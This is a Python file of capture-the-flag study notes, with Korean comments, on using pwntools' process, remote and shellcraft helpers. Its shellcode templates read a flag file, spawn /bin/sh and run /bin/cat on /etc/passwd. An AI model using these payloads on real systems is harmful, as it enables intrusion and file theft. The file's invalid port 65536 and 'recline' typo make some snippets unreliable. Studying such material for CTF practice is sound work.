from pwn import *







'''

 pwn
 1. process 클래스의 인스턴스를 만드는 것으로 elf 파일 실행 가능
 2. stdin에 문자열 입력
 3. stdin에 마지막에 띄어쓰기를 포함하고 문자열 입력
 4. 4바이트 문자열을 읽어옴
 5. 한줄 읽어옴
 6. printstring이라는 문자열이 출력을 받을때 다음 코드 실행
 7. 쉘 입출력 가능


r = process("filename.txt") #1
r.send("hello there") #2
r.sendline("hello there") #3
r.recv(4) #4
r.recvline() #5
r.recvuntil('printstring') #6
r.interactive() #7

'''


'''
 shellcraft
 
p = remote("host.test.com", 65536)

context.arch = "amd64"
context.log_level = 'debug'
path = "/path/to/flag"

shellcode = shellcraft.open(path)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)
shellcode = asm(shellcode)

print(shellcode)

payload = shellcode
p.sendlineafter("shellcode: ", payload)
print(p.recv(0x30))


 ex)
 
 1. /bin/sh 실행
 2. 어셈블리 코드를 기계어로 변환
 3. execve 시스템 콜 호출
 
shellcode_sh_asm = shellcraft.amd64.sh()
shellcode_sh_bytes = asm(shellcode_sh_asm)
shellcode_execve_asm = shellcraft.amd64.execve('/bin/cat', ['/bin/cat', '/etc/passwd'], 0)


p = process()
context(arch='i386', os='linux')

shellcode =''
shellcode += shellcraft.pushstr('flag')
shellcode += shellcraft.open('esp',0,0)
shellcode += shellcraft.read('eax', 'esp', 100)
shellcode += shellcraft.write(1, 'esp', 100)
log.info(shellcode)
p.recvuntil('shellcode:')
p.send(asm(shellcode))
log.success(p.recline())

'''

